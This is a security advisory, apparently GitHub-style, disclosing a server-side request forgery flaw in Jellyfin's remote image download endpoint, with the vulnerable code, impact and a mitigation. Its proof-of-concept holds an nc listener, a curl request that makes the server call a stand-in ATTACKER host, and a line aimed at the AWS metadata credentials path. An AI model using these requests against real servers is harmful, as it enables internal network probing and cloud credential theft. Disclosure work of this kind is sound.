# jellyfin/jellyfin: SSRF via unfiltered imageUrl in DownloadRemoteImage

**Package**: Jellyfin.Server
**Ecosystem**: NuGet
**Affected versions**: `<= 10.11.11` (latest)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N` — **6.8**
**CWE**: CWE-918 (Server-Side Request Forgery)

## Summary

`POST /Items/{id}/RemoteImages/Download?imageUrl=<url>` passes the caller-supplied
URL verbatim to `HttpClient.GetAsync` without host validation, allowlist enforcement,
or SSRF controls. An authenticated administrator can direct the Jellyfin server
process to make HTTP requests to any reachable host, including link-local metadata
services, internal APIs, and loopback services. When the response passes the
content-type check it is persisted as an item image and retrievable via the media
API, providing a partial-read SSRF oracle.

## Description

The vulnerable path runs through `ProviderManager.SaveImage` at
`MediaBrowser.Providers/Manager/ProviderManager.cs:192`:

```csharp
var response = await _httpClientFactory
    .CreateClient(NamedClient.Default)
    .GetAsync(url, cancellationToken)
    .ConfigureAwait(false);
```

`NamedClient.Default` is configured with a `SocketsHttpHandler` whose
`ConnectCallback` is `HttpClientExtension.OnConnect` — a HappyEyeballs TCP dialler
that calls `socket.ConnectAsync(context.DnsEndPoint)` with no IP address inspection.
There is no allowlist, no RFC-1918 rejection, and no DNS rebinding protection
anywhere in the call chain.

The content-type check fires after the full response body has been fetched and
buffered:

```csharp
if (!response.Content.Headers.ContentType?.MediaType?.StartsWith("image/", StringComparison.OrdinalIgnoreCase) ?? true)
{
    throw new HttpRequestException("Content is not an image.");
}
await _imageProcessor.SaveImageAsync(stream, mimeType, path);
```

For targets that return `Content-Type: image/*` — or via a redirect to a URL that
does — the body bytes are written to disk and exposed at
`GET /Items/{id}/Images/Primary`.

## Proof of Concept

```bash
# Prerequisites: Jellyfin running on :8096, valid admin API key

# 1. Start probe listener
nc -lvp 18765 &

# 2. Fire SSRF
curl -s -X POST \
  "http://localhost:8096/Items/$(curl -s http://localhost:8096/Items?Limit=1 \
     -H 'Authorization: MediaBrowser Token="ADMIN_KEY"' | python3 -c \
     "import sys,json; print(json.load(sys.stdin)['Items'][0]['Id'])")/RemoteImages/Download?imageUrl=http://ATTACKER:18765/probe&type=Primary" \
  -H 'Authorization: MediaBrowser Token="ADMIN_KEY"'

# 3. Probe listener receives:
# GET /probe HTTP/1.1
# Host: ATTACKER:18765
# User-Agent: Jellyfin-Server/10.11.11   ← confirms server-side request
```

**AWS IMDSv1 exfiltration** (where applicable):
```bash
# imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response is text/plain, so rejected after full read.
# For endpoints that return image/* content, full body is persisted and retrievable.
```

## Impact

- Internal network scanning via response timing and status codes.
- Cloud metadata exfiltration on IMDSv1-enabled instances (AWS, GCP, Azure, DO).
- Partial response-body read for any internal service returning `image/*` content.
- Redirect following (50 hops, default) enables traversal across internal services.

Precondition: valid admin credentials or API key. In deployments that share API keys
across services or where admin credentials are compromised, this provides full
internal network access from the server's network position.

## Mitigation

Resolve the target URL's hostname to an IP before opening the TCP connection and
reject RFC-1918, loopback, and link-local addresses:

```csharp
// In SocketsHttpHandler ConnectCallback, after DNS resolution:
var ip = addresses.First();
if (IPAddress.IsLoopback(ip)
    || ip.IsInRange("10.0.0.0/8")
    || ip.IsInRange("172.16.0.0/12")
    || ip.IsInRange("192.168.0.0/16")
    || ip.IsInRange("169.254.0.0/16"))
{
    throw new InvalidOperationException("SSRF: private address rejected");
}
```

Use a dedicated `NamedClient.RemoteImage` with this handler rather than patching
`NamedClient.Default`.
